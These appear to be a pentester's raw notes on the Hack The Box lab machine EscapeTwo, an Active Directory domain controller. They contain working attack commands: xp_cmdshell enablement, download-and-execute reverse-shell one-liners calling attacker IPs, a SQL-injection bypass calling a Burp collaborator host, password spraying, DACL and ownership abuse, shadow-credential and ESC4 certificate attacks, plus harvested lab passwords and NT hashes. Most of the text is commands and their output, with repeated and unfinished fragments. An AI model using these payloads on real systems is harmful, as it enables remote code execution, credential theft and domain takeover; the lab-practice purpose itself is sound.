___

# domain name: sequel.htb

DC01.sequel.htb

domain controller 

 
# |    Domain Information via RPC for 10.10.11.51    |
 
[+] Domain: SEQUEL
[+] Domain SID: S-1-5-21-548670397-972687484-3496335370
[+] Membership: domain member


# [+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x80102f'
Server type string: Wk Sv Sql PDC Tim NT


 ====================================
|    Users via RPC on 10.10.11.51    |
 ====================================
[*] Enumerating users via 'querydispinfo'
[+] Found 9 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 9 user(s) via 'enumdomusers'
[+] After merging user results we have 9 user(s) total:
'1103':
  username: michael
  name: Micael Scott
  acb: '0x00000210'
  description: (null)
'1114':
  username: ryan
  name: Ryan Howard
  acb: '0x00000210'
  description: (null)
'1116':
  username: oscar
  name: Oscar Martinez
  acb: '0x00000210'
  description: (null)
'1122':
  username: sql_svc
  name: SQL Service
  acb: '0x00000210'
  description: (null)
'1601':
  username: rose
  name: Rose Fox
  acb: '0x00000210'
  description: (null)
'1607':
  username: ca_svc
  name: Certification Authority
  acb: '0x00000210'
  description: (null)
'500':
  username: Administrator
  name: (null)
  acb: '0x00000210'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000215'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00020011'
  description: Key Distribution Center Service Account


# interesting groups

'1128':
  groupname: SQLServer2005SQLBrowserUser$DC01
  type: local
'1129':
  groupname: SQLRUserGroupSQLEXPRESS
  type: local


# shares (test these)

[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Accounting Department
[+] Mapping: OK, Listing: OK
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: OK
[*] Testing share Users
[+] Mapping: OK, Listing: OK



|    Policies via RPC for 10.10.11.51    | password policies
 ========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: 24
  Minimum password length: 7
  Maximum password age: 41 days 23 hours 53 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 10 minutes
  Lockout duration: 10 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: not set



# SQL server running on it (interesting check this out)

1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM

can use  or smbclient.py to acess samba shares (this is the better one ive found)

smbclient.py rose:KxEPkKe6R8su@10.10.11.51

smbclient -U rose '\\10.10.11.51\Accounting Department' 'KxEPkKe6R8su'


url="C:\Users\Ruy\Documents\HTB-DEV\EscapeTwo\" 


~/box/EscapeTwo/accounting_2024_dir/xl/
# has a binary called printedSettings ? 


# accounts_dir/xl/sharedStrings.xml has users and passwords !!!! sql database creds

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst


<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:angela@sequel.htb" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:oscar@sequel.htb" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:kevin@sequel.htb" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:sa@sequel.htb" TargetMode="External"/>

usernames



# database log in 

mssqlclient.py sa:'MSSQLP@ssw0rd!'@10.10.11.51


username: dbo

SQL (sa  dbo@master)> select @@version;
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
	Sep 24 2019 13:48:23 
	Copyright (C) 2019 Microsoft Corporation
	Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)

SQL (sa  dbo@master)> SELECT * FROM master.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME              TABLE_TYPE   
-------------   ------------   ---------------------   ----------   
master          dbo            spt_fallback_db         b'BASE TABLE'   

master          dbo            spt_fallback_dev        b'BASE TABLE'   

master          dbo            spt_fallback_usg        b'BASE TABLE'   

master          dbo            spt_values              b'VIEW'      

master          dbo            spt_monitor             b'BASE TABLE'   

master          dbo            MSreplication_options   b'BASE TABLE'   


```sql
# Get databases
SELECT name FROM master.dbo.sysdatabases;
```


 
# EXECUTING SHELL COMMANDS INSIDE MS-SQL


bash

```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
```


EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.32:80/update.ps1") | powershell -noprofile'



# THIS WORKED !!!!! I HAVE A SHELL AS THIS USER THE MS-SQL ACCOUNT

whoami
sequel\sql_svc


cat sql-Configuration.INI
[OPTIONS] ACTION="Install" QUIET="True" FEATURES=SQL INSTANCENAME="SQLEXPRESS" INSTANCEID="SQLEXPRESS" RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS" AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE" AGTSVCSTARTUPTYPE="Manual" COMMFABRICPORT="0" COMMFABRICNETWORKLEVEL=""0" COMMFABRICENCRYPTION="0" MATRIXCMBRICKCOMMPORT="0" SQLSVCSTARTUPTYPE="Automatic" FILESTREAMLEVEL="0" ENABLERANU="False"  SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS" SQLSVCACCOUNT="SEQUEL\sql_svc" SQLSVCPASSWORD="WqSZAF6CysDQbGb3" SQLSYSADMINACCOUNTS="SEQUEL\Administrator" SECURITYMODE="SQL" SAPWD="MSSQLP@ssw0rd!" ADDCURRENTUSERASSQLADMIN="False" TCPENABLED="1" NPENABLED="1" BROWSERSVCSTARTUPTYPE="Automatic" IAcceptSQLServerLicenseTerms=True


i have the user creds for sql_svc user so i can prob get a better shell with that and then go for user. #try_that_next_time

tried psexec wich uses smb did not work

tried all the impacket shells access denied

was it firewall issue???


# this is the port that allows remote powershell connections it is open

5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0



# using nishang for ps1 scripts 

powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]


powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.32/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.32 -Port 8080



 # sql-configuration.INI

cat sql-Configuration.INI
[OPTIONS] ACTION="Install" QUIET="True" FEATURES=SQL INSTANCENAME="SQLEXPRESS" INSTANCEID="SQLEXPRESS" RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS" AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE" AGTSVCSTARTUPTYPE="Manual" COMMFABRICPORT="0" COMMFABRICNETWORKLEVEL=""0" COMMFABRICENCRYPTION="0" MATRIXCMBRICKCOMMPORT="0" SQLSVCSTARTUPTYPE="Automatic" FILESTREAMLEVEL="0" ENABLERANU="False"  SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS" 

SQLSVCACCOUNT="SEQUEL\sql_svc" SQLSVCPASSWORD="WqSZAF6CysDQbGb3" 

SQLSYSADMINACCOUNTS="SEQUEL\Administrator" SECURITYMODE="SQL" 

SAPWD="MSSQLP@ssw0rd!"

ADDCURRENTUSERASSQLADMIN="False" TCPENABLED="1" NPENABLED="1" BROWSERSVCSTARTUPTYPE="Automatic" IAcceptSQLServerLicenseTerms=True


# brute force passwords 

sudo netexec winrm 10.10.11.51 -u 'ryan' -p passwords.txt


WqSZAF6CysDQbGb3

this pass is also for ryan user


# bloodhound data collection

bloodhound-python -u 'ryan' -p 'WqSZAF6CysDQbGb3' -d sequel.htb -ns 10.10.11.51 -c All

 ryan is write owner to CA_SVC 
 means ryan can edit atributes of it

bloodyad --host '10.10.11.51' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan' 
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc


# dacledit.py to edit the discretionary acess policy on the object and give ryan full control over it


dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' '10.10.11.51'/"ryan":"WqSZAF6CysDQbGb3"


# enumerated certificate templates with certipy using ryan account

../bin/python3 entry.py find -u 'ryan' -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -vulnerable -enabled -old-bloodhound

dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' '10.10.11.51'/"ryan":"WqSZAF6CysDQbGb3"

# this outputs the txt file
./bin/python3 ./certipy/entry.py find -u 'ryan' -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -vulnerable -enabled 


# this enumerates certificates as ryan I have to do it as ca_svc

https://seriotonctf.github.io/2024/06/26/ADCS-Attacks-with-Certipy/index.html

# this explains really well wtf is going on 
https://i-tracing.com/blog/dacl-shadow-credentials/

pfx file is a certificate file

.pem format can also be certificate file 



ldapdomaindump -u 'SEQUEL'\\'ryan' -p 'WqSZAF6CysDQbGb3' 10.10.11.51


# pywhisker
https://github.com/ShutdownRepo/pywhisker.git


# explains well more simplified
https://medium.com/@NightFox007/exploiting-and-detecting-shadow-credentials-and-msds-keycredentiallink-in-active-directory-9268a587d204


# this has the commands for whisker and certipy use this
https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/key-credentials-abuse

 
# generate certificate for ca_svc user to log into that account
└> ./bin/python3 ./certipy/entry.py shadow auto -u 'ryan' -p 'WqSZAF6CysDQbGb3' -account 'ca_svc' -target DC01.SEQUEL.htb -dc-ip 10.10.11.51                    Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce

./bin/python3 certipy/entry.py shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51' -target dc01.sequel.htb -ns 10.10.11.51
Certipy v4.8.2 - by Oliver Lyak (ly4k)

if cipher text error reset the machine some mf might have messed it up

[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce


# cheat sheet certipy
https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services


# resume of whitepaper with white paper link
https://posts.specterops.io/certified-pre-owned-d95910965cd2
try hack me room makes it make sense room:  CVE-2022-26923 -> patched cve not in the box but still uses certipy and helps you understand
AD Certificate Templates (room) helps you understand certificate templates



# enumerating certificates

└> ./bin/python3 certipy/entry.py find -k -dc-ip '10.10.11.51' -target 'dc01.sequel.htb' -enabled -vulnerable -stdout 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions




# steps


https://seriotonctf.github.io/2024/06/26/ADCS-Attacks-with-Certipy/index.html
look here

## ESC4

|   |
|---|
|certipy template -u username -p password -template template -save-old -dc-ip ip|

|   |
|---|
|certipy req -u username -p password -dc-ip ip -ca ca -target dc -template template -upn administrator|

certipy auth -pfx administrator.pfx -domain domain -u administrator -dc-ip ip

# what i did

./bin/python3 certipy/entry.py template -k -dc-ip '10.10.11.51' -target 'dc01.sequel.htb' -template 'DunderMifflinAuthentication' 
Certipy v4.8.2 - by Oliver Lyak (ly4k)




[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce


# hash admin

./bin/python3 certipy/entry.py auth -pfx administrator.pfx -domain 'sequel.htb' -u 'Administrator' -dc-ip '10.10.11.51'
Certipy v4.8.2 - by Oliver Lyak (ly4k)





